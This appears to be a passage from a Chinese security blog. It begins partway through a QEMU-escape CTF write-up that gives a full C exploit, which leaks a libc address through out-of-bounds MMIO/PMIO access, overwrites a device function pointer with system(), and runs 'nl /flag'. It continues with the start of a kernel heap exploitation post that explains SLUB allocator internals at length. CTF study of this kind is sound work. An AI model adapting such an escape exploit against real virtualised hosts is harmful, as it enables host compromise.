   if ( val &lt;= 0x100 )      opaque-&gt;seek = val;  &#125;  else if ( addr &gt; 8 )  &#123;    if ( addr == 28 )    &#123;      opaque-&gt;r_seed = val;      key = opaque-&gt;key;      do        *key++ = (opaque-&gt;rand_r)(&amp;opaque-&gt;r_seed, 28LL, val, *&amp;size);      while ( key != &amp;opaque-&gt;rand_r );    &#125;  &#125;  else if ( addr )  &#123;    if ( addr == 4 )    &#123;      *opaque-&gt;key = 0LL;      *&amp;opaque-&gt;key[2] = 0LL;    &#125;  &#125;  else  &#123;    opaque-&gt;memory_mode = val;  &#125;&#125;\n\n这里不说pmio_read函数了，因为确实没啥用就不浪费篇幅了。这里看pmio_write函数，可以喊到在port等于28时会给r_seek赋值，并且会调用opaque-&gt;rand_r第一个参数就是opaque-&gt;r_seed的地址。而在addr等于8并且val小于0x100时则是往seek中写入值。可以看出来这里漏洞一样是存在越界使用结构体。\n利用分析这里的利用思路也是较为清晰的\n\n  首先修改seek配合addr实现使用mmio_write函数实现越界写，将opaque-&gt;rand_r原有的函数地址进行tea加密并且写入到当前位置。\n  两次调用mmio_read函数，分别读取opaque-&gt;rand_r高位和低位泄漏出libc地址，进而拿到system地址。\n  应为r_seek成员和blocks成员紧邻的缘故，恢复seek为0并通过addr在blocks成员开始位置写入flag\n  最后直接调用pmio_write并且port为28修改r_seed为nl /即可调用nl /flag\n\n综上，exp#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;void die(const char *msg)&#123;    perror(msg);    exit(-1);&#125;char *userbuf;uint64_t phy_userbuf;unsigned char *mmio_mem;unsigned int port_base = 0xc040;void mmio_write(uint32_t addr, uint32_t value)&#123;    *((uint32_t *)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123;    return *((uint32_t *)(mmio_mem + addr));&#125;void pmio_write(size_t port, u_int32_t val)&#123;    outl(val, port_base + port);&#125;size_t pmio_read(size_t port)&#123;    return inl(port_base + port);&#125;unsigned int key[4];size_t tea(size_t m)&#123;    uint64_t v3;    signed int v4;   // esi    unsigned int v5; // ecx    uint64_t result; // rax    v3 = m;    v4 = -957401312;    v5 = v3;    result = v3 &gt;&gt; 32;    do    &#123;        result = result - ((v5 + v4) ^ (key[3] + (v5 &gt;&gt; 5)) ^ (key[2] + 16 * v5));        v5 -= (result + v4) ^ (key[1] + ((unsigned int)result &gt;&gt; 5)) ^ (key[0] + 16 * result);        v4 += 1640531527;    &#125; while (v4);    printf(&quot;0x%lx\\n&quot;, v5);    printf(&quot;0x%lx\\n&quot;, result);    return result &lt;&lt; 32 | (u_int64_t)v5;&#125;int main()&#123;    int mmio_fd = open(&quot;/sys/bus/pci/devices/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    if (iopl(3) != 0)    &#123;        puts(&quot;iopl fail!&quot;);        exit(-1);    &#125;    unsigned long long rand_r;    unsigned long long libc_base;    unsigned long long system_addr;    pmio_write(8, 0x100);    mmio_write(8, 0);    mmio_write(0x18, 0);    rand_r = mmio_read(0x18);    rand_r += ((unsigned long long)mmio_read(0x18)) &lt;&lt; 32;    libc_base = rand_r - 0x25d30;    system_addr = libc_base + 0x30290;    printf(&quot;%p\\n&quot;, rand_r);    key[0] = pmio_read(12);    key[1] = pmio_read(16);    key[2] = pmio_read(20);    key[3] = pmio_read(24);    for (int i = 0; i &lt; 4; i++)    &#123;        printf(&quot;key%d: %p\\n&quot;, i, key[i]);    &#125;    unsigned long long t_system_addr;    t_system_addr = tea(system_addr);    mmio_write(0x18, t_system_addr &amp; 0xffffffff);    mmio_write(0x18, t_system_addr &gt;&gt; 32);    pmio_write(8, 0);    mmio_write(0, 0x67616c66);    pmio_write(28, 0x2f206c6e);&#125;\n\n\n\n题目链接:    https://github.com/196082/196082/tree/main/qemu_escape\n","categories":["qemu escape"],"tags":["mmio","pmio"]},{"title":"Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique","url":"/2023/11/23/Pspray-Timing-Side-Channel-based-Linux-Kernel-Heap-Exploitation-Technique/","content":"前言近期在工作上遇到的内核很少，以至于我都快忘记了我是玩内核的了。这篇文章需要一点slub allocator的基础，所以为什么我以前要偷懒不写slub allocator啊！！！当然这些基础在以前都是默认大家都已经学习过的了，在这里虽然可以一样这样，但是我觉得如果再不分析以后可能就没多少时间写这类分析细致的文章了。\nslub allocator基本结构\n上面这张overview大家应该都挺熟悉的。\n了解过Linux kernel内存管理的朋友应该知道slab allocator主要有三个版本：\n\n slab  最初的版本，机制复杂，效率低\n slob  用于嵌入式场景的极简版本\n slub  优化后的版本，现在常用\n\n所以后面均已slub为例。\nslabLinux kernel 中用以统筹所有内存的依然是buddy system，slub allocator也不例外，其负责向buddy system请求内存后分割给多个小 object 后再返还给上层调用者，单次向buddy system所请求的一份连续内存页便称之为一张 slab，在内核中对应 slab 结构体，本质上是复用 page 结构体：\nstruct slab &#123;\tunsigned long __page_flags;#if defined(CONFIG_SLAB)// ... ...#elif defined(CONFIG_SLUB)\tstruct kmem_cache *slab_cache;\tunion &#123;\t\tstruct &#123;\t\t\tunion &#123;\t\t\t\tstruct list_head slab_list;#ifdef CONFIG_SLUB_CPU_PARTIAL\t\t\t\tstruct &#123;\t\t\t\t\tstruct slab *next;\t\t\t\t\tint slabs;\t/* Nr of slabs left */\t\t\t\t&#125;;#endif\t\t\t&#125;;\t\t\t/* Double-word boundary */\t\t\tunion &#123;\t\t\t\tstruct &#123;\t\t\t\t\tvoid *freelist;\t\t/* first free object */\t\t\t\t\tunion &#123;\t\t\t\t\t\tunsigned long counters;\t\t\t\t\t\tstruct &#123;\t\t\t\t\t\t\tunsigned inuse:16;\t\t\t\t\t\t\tunsigned objects:15;\t\t\t\t\t\t\tunsigned frozen:1;\t\t\t\t\t\t&#125;;\t\t\t\t\t&#125;;\t\t\t\t&#125;;#ifdef system_has_freelist_aba\t\t\t\tfreelist_aba_t freelist_counter;#endif\t\t\t&#125;;\t\t&#125;;\t\tstruct rcu_head rcu_head;\t&#125;;\tunsigned int __unused;#else#error &quot;Unexpected slab allocator configured&quot;#endif\tatomic_t __page_refcount;#ifdef CONFIG_MEMCG\tunsigned long memcg_data;#endif&#125;;\n\n这里简单解释一下前面的成员：\n\n  slab_cache: 该slab对应的内存池\n  freelist: slab上空闲的第一个对象，形式为单向链表以NULL结尾\n  slab_list: 按照其用途连接多个slabs双向链表\n  inuse: 已被使用的对象数量\n  objects: 该slab上的对象总数\n  frozen: 是否被冻结，即其已经归属于特定的CPU\n\n\n  这里我们需要注意的是 counters 成员直接涵盖了 inuse &amp; objects &amp; frozen，后面会有大量的直接通过 counters 成员进行赋值的操作，实际上就是赋值了 inuse &amp; objects &amp; frozen\n\n和page结构体类似，这里slab也是对应一张slab内存页，可以通过page_to_pfn函数等可以直接完成slab结构体到内存页虚拟地址的转化，当然反过来也可以从一个空闲空间的虚拟地址找到其对应的slab结构体。\n\nkmem_cachekmem_cache想必各位较为熟悉，其用于分配特定大小对象的内存池，所有的kmem_cache构成一个双向链表，并存放于一个用于存放通用kmem_cache的数组kmem_caches。\nstruct kmem_cache *kmalloc_caches[NR_KMALLOC_TYPES][KMALLOC_SHIFT_HIGH + 1] __ro_after_init =&#123; /* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */ &#125;;EXPORT_SYMBOL(kmalloc_caches);\n\n下面看一下kmem_cache的定义：\nstruct kmem_cache &#123;#ifndef CONFIG_SLUB_TINY\tstruct kmem_cache_cpu __percpu *cpu_slab;#endif\t/* Used for retrieving partial slabs, etc. */\tslab_flags_t flags;\tunsigned long min_partial;\tunsigned int size;\t/* The size of an object including metadata */\tunsigned int object_size;/* The size of an object without metadata */\tstruct reciprocal_value reciprocal_size;\tunsigned int offset;\t/* Free pointer offset */#ifdef CONFIG_SLUB_CPU_PARTIAL\t/* Number of per cpu partial objects to keep around */\tunsigned int cpu_partial;\t/* Number of per cpu partial slabs to keep around */\tunsigned int cpu_partial_slabs;#endif\tstruct kmem_cache_order_objects oo;\t/* Allocation and freeing of slabs */\tstruct kmem_cache_order_objects min;\tgfp_t allocflags;\t/* gfp flags to use on each alloc */\tint refcount;\t\t/* Refcount for slab cache destroy */\tvoid (*ctor)(void *);\tunsigned int inuse;\t\t/* Offset to metadata */\tunsigned int align;\t\t/* Alignment */\tunsigned int red_left_pad;\t/* Left redzone padding size */\tconst char *name;\t/* Name (only for display!) */\tstruct list_head list;\t/* List of slab caches */#ifdef CONFIG_SYSFS\tstruct kobject kobj;\t/* For sysfs */#endif#ifdef CONFIG_SLAB_FREELIST_HARDENED\tunsigned long random;#endif#ifdef CONFIG_NUMA\t/*\t * Defragmentation by allocating from a remote node.\t */\tunsigned int remote_node_defrag_ratio;#endif#ifdef CONFIG_SLAB_FREELIST_RANDOM\tunsigned int *random_seq;#endif#ifdef CONFIG_KASAN_GENERIC\tstruct kasan_cache kasan_info;#endif#ifdef CONFIG_HARDENED_USERCOPY\tunsigned int useroffset;\t/* Usercopy region offset */\tunsigned int usersize;\t\t/* Usercopy region size */#endif\tstruct kmem_cache_node *node[MAX_NUMNODES];&#125;;\n\n首先这里第一个成员cpu_slab其为__percpu变量指向一个kmem_cache_cpu结构体，即当前CPU独占的内存池。min_partial指的是node partial链表上slab的最大数量。cpu_partial_slabs指的是cpu partial链表上slab的最大数量。size一个对象的实际大小。object_size对象所有数据的大小。offset即空闲对象链表指针对于其对象的偏移。min一个slab上最少的对象数量。allocflags向buddy system申请页面时所使用的gfp flag。ctor对象的构造函数。\nrandom_seq: 用于在 slab 初始化时随机化 freelist 上空闲对象的连接顺序。\nuseroffset: 用户空间能读写的起始偏移，后面的就时用户空间能读写的大小。\nnode: 一个 kmem_cache_node 数组，对应多个不同 node 的后备内存池\n\n关于其合并和类型之类的前面的文章提到过，可以去看看 CVE-2022-0185复现 。\nkmem_cache_cpu当一个进程请求分配内存时，首先会尝试向当前CPU的独占内存池进行分配\nstruct kmem_cache_cpu &#123;\tunion &#123;\t\tstruct &#123;\t\t\tvoid **freelist;\t/* Pointer to next available object */\t\t\tunsigned long tid;\t/* Globally unique transaction id */\t\t&#125;;\t\tfreelist_aba_t freelist_tid;\t&#125;;\tstruct slab *slab;\t/* The slab from which we are allocating */#ifdef CONFIG_SLUB_CPU_PARTIAL\tstruct slab *partial;\t/* Partially allocated frozen slabs */#endif\tlocal_lock_t lock;\t/* Protects the fields above */#ifdef CONFIG_SLUB_STATS\tunsigned stat[NR_SLUB_STAT_ITEMS];#endif&#125;;\n\n而这里的kmem_cache_cpu结构体代表的就是每个CPU独占的内存池。这里的结构体比较简单且眼熟，首先就是freelist含义一样指向下一个空闲的对象。slab指向当前用于分配的slab。partial指向的是percpu partial list链表。\n\nkmem_cache_nodestruct kmem_cache_node &#123;#ifdef CONFIG_SLAB // ... ...#endif#ifdef CONFIG_SLUB\tspinlock_t list_lock;\tunsigned long nr_partial;\tstruct list_head partial;#ifdef CONFIG_SLUB_DEBUG\tatomic_long_t nr_slabs;\tatomic_long_t total_objects;\tstruct list_head full;#endif#endif&#125;;\n\n其含义为每个node的后备内存池，当percpu的内存池分配完毕之后就会想node的后备内存池进行内存申请。\n这里的partial成员同前面的一致，nr_partial很好理解，就是partial的数量。这里的full成员连接的是slab page中的所有对象都已经被使用的slab另外两个计数的也很好理解了。\n\n对象的分配slab_alloc_nodestatic __fastpath_inline void *slab_alloc_node(struct kmem_cache *s, struct list_lru *lru,\t\tgfp_t gfpflags, int node, unsigned long addr, size_t orig_size)&#123;\tvoid *object;\tstruct obj_cgroup *objcg = NULL;\tbool init = false;\ts = slab_pre_alloc_hook(s, lru, &amp;objcg, 1, gfpflags);\tif (!s)\t\treturn NULL;\tobject = kfence_alloc(s, orig_size, gfpflags);\tif (unlikely(object))\t\tgoto out;\tobject = __slab_alloc_node(s, gfpflags, node, addr, orig_size);\tmaybe_wipe_obj_freeptr(s, object);\tinit = slab_want_init_on_alloc(gfpflags, s);out:\t/*\t * When init equals &#x27;true&#x27;, like for kzalloc() family, only\t * @orig_size bytes might be zeroed instead of s-&gt;object_size\t */\tslab_post_alloc_hook(s, objcg, gfpflags, 1, &amp;object, init, orig_size);\treturn object;&#125;\n\n首先是通过slab_pre_alloc_hook函数进行检测标识位，随后调用kfence_alloc进行内存错误检测，接下来调用__slab_alloc_node函数进行真正的内存分配，最后两个函数则是将对象原本用于存放next object的位置写为0，最后则是看标识位是否有__GFP_ZERO，若是有则调用slab_post_alloc_hook将堆块上的数据清零。\nstatic __always_inline void *__slab_alloc_node(struct kmem_cache *s,\t\tgfp_t gfpflags, int node, unsigned long addr, size_t orig_size)&#123;\tstruct kmem_cache_cpu *c;\tstruct slab *slab;\tunsigned long tid;\tvoid *object;redo:\tc = raw_cpu_ptr(s-&gt;cpu_slab);\ttid = READ_ONCE(c-&gt;tid);\tbarrier();\tobject = c-&gt;freelist;\tslab = c-&gt;slab;\tif (!USE_LOCKLESS_FAST_PATH() ||\t    unlikely(!object || !slab || !node_match(slab, node))) &#123;\t\tobject = __slab_alloc(s, gfpflags, node, addr, c, orig_size);\t&#125; else &#123;\t\tvoid *next_object = get_freepointer_safe(s, object);\t\tif (unlikely(!__update_cpu_freelist_fast(s, object, next_object, tid))) &#123;\t\t\tnote_cmpxchg_failure(&quot;slab_alloc&quot;, s, tid);\t\t\tgoto redo;\t\t&#125;\t\tprefetch_freepointer(s, next_object);\t\tstat(s, ALLOC_FASTPATH);\t&#125;\treturn object;&#125;\n\n首先这里获取percpu上的kmem_cache_cpu，然后获得其freelist以及slab。若 slab 或 freelist 为空 / slab 与 node 不匹配，则调用 __slab_alloc() 分配一张新 slab 并从其中获取一个空闲对象。\n这里先考虑条件成立的情况那么就会调用get_freepointer_safe获取到当前空闲对象的下一个空闲对象，接下来调用__update_cpu_freelist_fast函数进行检查是否发生了抢占，如果是则跳回redo重新获取kmem_cache_cpu。最后通过prefetch_freepointer将已分配对象的地址载入缓存中，之后返回分配成功的对象。\n前面主要说的是当slab和freelist存在时的情况，下面主要提一下if分支内的内容。这里是直接调用了__slab_alloc函数\nstatic void *__slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node,\t\t\t  unsigned long addr, struct kmem_cache_cpu *c, unsigned int orig_size)&#123;\tvoid *p;#ifdef CONFIG_PREEMPT_COUNT\t/*\t * We may have been preempted and rescheduled on a different\t * cpu before disabling preemption. Need to reload cpu area\t * pointer.\t */\tc = slub_get_cpu_ptr(s-&gt;cpu_slab);#endif\tp = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);#ifdef CONFIG_PREEMPT_COUNT\tslub_put_cpu_ptr(s-&gt;cpu_slab);#endif\treturn p;&#125;\n\n其主要是对___slab_alloc函数的wrapper\nstatic void *___slab_alloc(struct kmem_cache *s, gfp_t gfpflags, int node,\t\t\t  unsigned long addr, struct kmem_cache_cpu *c, unsigned int orig_size)&#123;\tvoid *freelist;\tstruct slab *slab;\tunsigned long flags;\tstruct partial_context pc;\tstat(s, ALLOC_SLOWPATH);reread_slab:\tslab = READ_ONCE(c-&gt;slab);\tif (!slab) &#123;\t\t/*\t\t * if the node is not online or has no normal memory, just\t\t * ignore the node constraint\t\t */\t\tif (unlikely(node != NUMA_NO_NODE &amp;&amp;\t\t\t     !node_isset(node, slab_nodes)))\t\t\tnode = NUMA_NO_NODE;\t\tgoto new_slab;\t&#125;redo:\tif (unlikely(!node_match(slab, node))) &#123;\t\t/*\t\t * same as above but node_match() being false already\t\t * implies node != NUMA_NO_NODE\t\t */\t\tif (!node_isset(node, slab_nodes)) &#123;\t\t\tnode = NUMA_NO_NODE;\t\t&#125; else &#123;\t\t\tstat(s, ALLOC_NODE_MISMATCH);\t\t\tgoto deactivate_slab;\t\t&#125;\t&#125;\t/*\t * By rights, we should be searching for a slab page that was\t * PFMEMALLOC but right now, we are losing the pfmemalloc\t * information when the page leaves the per-cpu allocator\t */\tif (unlikely(!pfmemalloc_match(slab, gfpflags)))\t\tgoto deactivate_slab;\t/* must check again c-&gt;slab in case we got preempted and it changed */\tlocal_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);\tif (unlikely(slab != c-&gt;slab)) &#123;\t\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\t\tgoto reread_slab;\t&#125;\tfreelist = c-&gt;freelist;\tif (freelist)\t\tgoto load_freelist;\tfreelist = get_freelist(s, slab);\tif (!freelist) &#123;\t\tc-&gt;slab = NULL;\t\tc-&gt;tid = next_tid(c-&gt;tid);\t\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\t\tstat(s, DEACTIVATE_BYPASS);\t\tgoto new_slab;\t&#125;\tstat(s, ALLOC_REFILL);load_freelist:\tlockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));\t/*\t * freelist is pointing to the list of objects to be used.\t * slab is pointing to the slab from which the objects are obtained.\t * That slab must be frozen for per cpu allocations to work.\t */\tVM_BUG_ON(!c-&gt;slab-&gt;frozen);\tc-&gt;freelist = get_freepointer(s, freelist);\tc-&gt;tid = next_tid(c-&gt;tid);\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\treturn freelist;deactivate_slab:\tlocal_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);\tif (slab != c-&gt;slab) &#123;\t\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\t\tgoto reread_slab;\t&#125;\tfreelist = c-&gt;freelist;\tc-&gt;slab = NULL;\tc-&gt;freelist = NULL;\tc-&gt;tid = next_tid(c-&gt;tid);\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\tdeactivate_slab(s, slab, freelist);new_slab:\tif (slub_percpu_partial(c)) &#123;\t\tlocal_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);\t\tif (unlikely(c-&gt;slab)) &#123;\t\t\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\t\t\tgoto reread_slab;\t\t&#125;\t\tif (unlikely(!slub_percpu_partial(c))) &#123;\t\t\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\t\t\t/* we were preempted and partial list got empty */\t\t\tgoto new_objects;\t\t&#125;\t\tslab = c-&gt;slab = slub_percpu_partial(c);\t\tslub_set_percpu_partial(c, slab);\t\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\t\tstat(s, CPU_PARTIAL_ALLOC);\t\tgoto redo;\t&#125;new_objects:\tpc.flags = gfpflags;\tpc.slab = &amp;slab;\tpc.orig_size = orig_size;\tfreelist = get_partial(s, node, &amp;pc);\tif (freelist)\t\tgoto check_new_slab;\tslub_put_cpu_ptr(s-&gt;cpu_slab);\tslab = new_slab(s, gfpflags, node);\tc = slub_get_cpu_ptr(s-&gt;cpu_slab);\tif (unlikely(!slab)) &#123;\t\tslab_out_of_memory(s, gfpflags, node);\t\treturn NULL;\t&#125;\tstat(s, ALLOC_SLAB);\tif (kmem_cache_debug(s)) &#123;\t\tfreelist = alloc_single_from_new_slab(s, slab, orig_size);\t\tif (unlikely(!freelist))\t\t\tgoto new_objects;\t\tif (s-&gt;flags &amp; SLAB_STORE_USER)\t\t\tset_track(s, freelist, TRACK_ALLOC, addr);\t\treturn freelist;\t&#125;\t/*\t * No other reference to the slab yet so we can\t * muck around with it freely without cmpxchg\t */\tfreelist = slab-&gt;freelist;\tslab-&gt;freelist = NULL;\tslab-&gt;inuse = slab-&gt;objects;\tslab-&gt;frozen = 1;\tinc_slabs_node(s, slab_nid(slab), slab-&gt;objects);check_new_slab:\tif (kmem_cache_debug(s)) &#123;\t\t/*\t\t * For debug caches here we had to go through\t\t * alloc_single_from_partial() so just store the tracking info\t\t * and return the object\t\t */\t\tif (s-&gt;flags &amp; SLAB_STORE_USER)\t\t\tset_track(s, freelist, TRACK_ALLOC, addr);\t\treturn freelist;\t&#125;\tif (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;\t\t/*\t\t * For !pfmemalloc_match() case we don&#x27;t load freelist so that\t\t * we don&#x27;t make further mismatched allocations easier.\t\t */\t\tdeactivate_slab(s, slab, get_freepointer(s, freelist));\t\treturn freelist;\t&#125;retry_load_slab:\tlocal_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);\tif (unlikely(c-&gt;slab)) &#123;\t\tvoid *flush_freelist = c-&gt;freelist;\t\tstruct slab *flush_slab = c-&gt;slab;\t\tc-&gt;slab = NULL;\t\tc-&gt;freelist = NULL;\t\tc-&gt;tid = next_tid(c-&gt;tid);\t\tlocal_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);\t\tdeactivate_slab(s, flush_slab, flush_freelist);\t\tstat(s, CPUSLAB_FLUSH);\t\tgoto retry_load_slab;\t&#125;\tc-&gt;slab = slab;\tgoto load_freelist;&#125;\n\n而___slab_alloc函数才是其核心函数，首先是reread_slab标签中，判断是否存在slab如果不存在则跳转到new_slab。\n在new_slab会检查是否存在percpu partial slab，如果存在则将则将链表中取出一个slab给到percpu slab随后跳进redo。\n在redo标签中，首先判断slab是否和node以及分配标识位匹配，如果不匹配则跳转至deactivate_slab标签，紧接着验证当前的slab是否是原来cpu的slab，如果不是则表示发生了抢占跳转到reread_slab标签中。随后获取freelist若freelist不为空则跳转到load_freelist中，若为空则调用get_freelist函数获取slab的freelist如果仍然为空，则将percpu slab的freelist设置为NULL随后跳转到下一个tid，并重新进入new_slab标签获取slab。\n随后看load_freelist标签，这一段就比较简单理解了，就是将freelist的next指针赋值给percpu freelist，然后获得下一个tid随后返回freelist。可以注意到的是这里使用的是get_freepointer函数，而这个函数最终会调用到freelist_ptr_decode函数。\nstatic inline void *freelist_ptr_decode(const struct kmem_cache *s,\t\t\t\t\tfreeptr_t ptr, unsigned long ptr_addr)&#123;\tvoid *decoded;#ifdef CONFIG_SLAB_FREELIST_HARDENED\tdecoded = (void *)(ptr.v ^ s-&gt;random ^ swab(ptr_addr));#else\tdecoded = (void *)ptr.v;#endif\treturn decoded;&#125;\n\n简单观察这个函数可以发现即便是开启了Hardened freelist保护的情况下slab-&gt;freelist都是没有加密的，加密的只是对象上的内容。\n回到前面的流程进入到deactivate_slab标签中，这里逻辑很简单，就是将percpu的freelist和slab设置为NULL并且获取到下一个tid之后直接调用deactivate_slab函数，对整张slab进行deactivate。\nstatic void deactivate_slab(struct kmem_cache *s, struct slab *slab,\t\t\t    void *freelist)&#123;\tenum slab_modes &#123; M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;\tstruct kmem_cache_node *n = get_node(s, slab_nid(slab));\tint free_delta = 0;\tenum slab_modes mode = M_NONE;\tvoid *nextfree, *freelist_iter, *freelist_tail;\tint tail = DEACTIVATE_TO_HEAD;\tunsigned long flags = 0;\tstruct slab new;\tstruct slab old;\tif (slab-&gt;freelist) &#123;\t\tstat(s, DEACTIVATE_REMOTE_FREES);\t\ttail = DEACTIVATE_TO_TAIL;\t&#125;\t/*\t * Stage one: Count the objects on cpu&#x27;s freelist as free_delta and\t * remember the last object in freelist_tail for later splicing.\t */\tfreelist_tail = NULL;\tfreelist_iter = freelist;\twhile (freelist_iter) &#123;\t\tnextfree = get_freepointer(s, freelist_iter);\t\t/*\t\t * If &#x27;nextfree&#x27; is invalid, it is possible that the object at\t\t * &#x27;freelist_iter&#x27; is already corrupted.  So isolate all objects\t\t * starting at &#x27;freelist_iter&#x27; by skipping them.\t\t */\t\tif (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))\t\t\tbreak;\t\tfreelist_tail = freelist_iter;\t\tfree_delta++;\t\tfreelist_iter = nextfree;\t&#125;\t/*\t * Stage two: Unfreeze the slab while splicing the per-cpu\t * freelist to the head of slab&#x27;s freelist.\t *\t * Ensure that the slab is unfrozen while the list presence\t * reflects the actual number of objects during unfreeze.\t *\t * We first perform cmpxchg holding lock and insert to list\t * when it succeed. If there is mismatch then the slab is not\t * unfrozen and number of objects in the slab may have changed.\t * Then release lock and retry cmpxchg again.\t */redo:\told.freelist = READ_ONCE(slab-&gt;freelist);\told.counters = READ_ONCE(slab-&gt;counters);\tVM_BUG_ON(!old.frozen);\t/* Determine target state of the slab */\tnew.counters = old.counters;\tif (freelist_tail) &#123;\t\tnew.inuse -= free_delta;\t\tset_freepointer(s, freelist_tail, old.freelist);\t\tnew.freelist = freelist;\t&#125; else\t\tnew.freelist = old.freelist;\tnew.frozen = 0;\tif (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;\t\tmode = M_FREE;\t&#125; else if (new.freelist) &#123;\t\tmode = M_PARTIAL;\t\t/*\t\t * Taking the spinlock removes the possibility that\t\t * acquire_slab() will see a slab that is frozen\t\t */\t\tspin_lock_irqsave(&amp;n-&gt;list_lock, flags);\t&#125; else &#123;\t\tmode = M_FULL_NOLIST;\t&#125;\tif (!slab_update_freelist(s, slab,\t\t\t\told.freelist, old.counters,\t\t\t\tnew.freelist, new.counters,\t\t\t\t&quot;unfreezing slab&quot;)) &#123;\t\tif (mode == M_PARTIAL)\t\t\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\t\tgoto redo;\t&#125;\tif (mode == M_PARTIAL) &#123;\t\tadd_partial(n, slab, tail);\t\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\t\tstat(s, tail);\t&#125; else if (mode == M_FREE) &#123;\t\tstat(s, DEACTIVATE_EMPTY);\t\tdiscard_slab(s, slab);\t\tstat(s, FREE_SLAB);\t&#125; else if (mode == M_FULL_NOLIST) &#123;\t\tstat(s, DEACTIVATE_FULL);\t&#125;&#125;\n\n这里简单提一下deacticate_slab函数的逻辑，遍历freelist检查是否被破坏，放弃被破坏的部分，将slab-&gt;freelist设为原kmem_cache_cpu-&gt;freelist，若slab上原有freelist不为 NULL 则再接到后面，设置 slab 的 counters，其中将 frozen 设为 0，若 slab 上的对象全部空闲且 node 的 partial slab 数量大于 kmem_cache-&gt;min_partial，调用 discard_slab() 将 slab 释放，若 slab 上存在空闲对象，调用 add_partial() 将其加入 node 的 partial 链表。这里的操作在 CVE-2022-2588复现 里面的CVE-2023-3269中使用过。\n接下来进入new_object标签内，若是percpu partial链表也为空，便会进入到这个标签内。这里首先会分配一个新的slab并设置partial_context，调用get_partial尝试从当前node的kmem_cache_node的partial链表中分配一个slab，若成功则直接跳转到check_new_slab。\nstatic void *get_partial(struct kmem_cache *s, int node, struct partial_context *pc)&#123;\tvoid *object;\tint searchnode = node;\tif (node == NUMA_NO_NODE)\t\tsearchnode = numa_mem_id();\tobject = get_partial_node(s, get_node(s, searchnode), pc);\tif (object || node != NUMA_NO_NODE)\t\treturn object;\treturn get_any_partial(s, pc);&#125;\n\n这里如果node的为NUMA_NO_NODE则会调用get_any_partial尝试从其他的node的kmem_cache_node中分配。如果get_partial函数没能从node的kmem_cache_node中获得slab的话则会调用new_slab向buddy system申请一份新的slab。\n在拿到slab之后继续往后面走会先判断是否有SLAB_DEBUG_FLAGS标识位，如果有则调用alloc_single_from_new_slab函数，从新分配的slab中获取一个对象之后放回partial/full中，如果失败则退出，成功返回。若是没有设置SLAB_DEBUG_FLAGS这个标识位，那就获取slab的freelist随后调用inc_slabs_node函数给node的引用计数增加。\n接下来看check_new_slab标签，这里面做的事比较少，首先则是检查该kmem_cache是否设置了SLAB_DEBUG_FLAGS标识位，然后检查是否设置了SLAB_STORE_USER标识位，随后返回freelist。如果没有设置则调用pfmemalloc_match检查slab与分配标识位是否不匹配，如果不匹配则调用deactivate_slab禁用slab并返回freelist。\n最后就是retry_load_slab标签，这里就是尝试加载新获得的slab，如果percpu slab不为NULL，那么这里就将其和freelist设置为NULL，随后调用deactivate_slab禁用slab并获取下一个tid，最后将新获得的slab设置到percpu slab随后跳转到load_freelist分配对象并返回。\nkmalloc前面主要是slub算法的核心逻辑，下面来对象分配更上级的函数\nstatic __always_inline __alloc_size(1) void *kmalloc(size_t size, gfp_t flags)&#123;\tif (__builtin_constant_p(size) &amp;&amp; size) &#123;\t\tunsigned int index;\t\tif (size &gt; KMALLOC_MAX_CACHE_SIZE)\t\t\treturn kmalloc_large(size, flags);\t\tindex = kmalloc_index(size);\t\treturn kmalloc_trace(\t\t\t\tkmalloc_caches[kmalloc_type(flags, _RET_IP_)][index],\t\t\t\tflags, size);\t&#125;\treturn __kmalloc(size, flags);&#125;\n\n这个函数的逻辑很简单，首先看size为编译预知的，如果不是则直接调用__kmalloc。如果是则进入内部，首先会判断size是否大于KMALLOC_MAX_CACHE_SIZE如果是则直接调用kmalloc_large进行分配并返回，如果不是则调用kmalloc_index函数获取到索引随后使用kmalloc_trace函数进行分配。\nstatic void *__kmalloc_large_node(size_t size, gfp_t flags, int node)&#123;\tstruct page *page;\tvoid *ptr = NULL;\tunsigned int order = get_order(size);\tif (unlikely(flags &amp; GFP_SLAB_BUG_MASK))\t\tflags = kmalloc_fix_flags(flags);\tflags |= __GFP_COMP;\tpage = alloc_pages_node(node, flags, order);\tif (page) &#123;\t\tptr = page_address(page);\t\tmod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,\t\t\t\t      PAGE_SIZE 